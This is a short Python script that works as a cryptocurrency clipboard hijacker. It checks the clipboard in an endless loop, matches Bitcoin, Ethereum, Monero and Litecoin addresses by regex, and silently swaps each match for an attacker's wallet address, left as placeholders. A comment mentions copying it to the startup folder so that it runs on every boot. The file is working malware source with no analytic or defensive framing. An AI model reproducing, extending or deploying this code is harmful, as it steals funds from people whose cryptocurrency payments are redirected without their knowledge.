import pyperclip as pc
import time
import re

#moves program to startup folder. rename file_name.exe

BTC_address = "BTC WALLET HERE"
ETH_address = "ETH WALLET HERE"
MON_address  = "MONERO WALLET HERE"
LTC_address = "LTC WALLET HERE"
#coming soon?
BNB_wallet = "BNB WALLET HERE"
SOL_wallet = "SOL WALLET HERE"
XRP_wallet = "XRP WALLET HERE"

def clip():
    s = str(pc.paste())
    length_of_s = len(s)
    btc_check = re.match("([13]|bc1)[A-HJ-NP-Za-km-z1-9]{27,34}", s)
    btc_match = bool(btc_check)
    eth_check = re.match("^0x[a-fA-F0-9]{40}$", s)
    eth_match = bool(eth_check)
    mon_check = re.match("^4([0-9]|[A-B])(.){93}", s)
    mon_match = bool(mon_check)
    ltc_check = re.match("[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}", s)
    ltc_match = bool(ltc_check)
    wallet_check = ""
    time.sleep(0.25)
    if btc_match == True:
        pc.copy(BTC_address)
    elif eth_match == True:
        pc.copy(ETH_address)
    elif mon_match == True:
        pc.copy(MON_address)
    elif ltc_match == True:
        pc.copy(LTC_address)
    else:
        wallet_check = "ignore"


while True:
    clip()
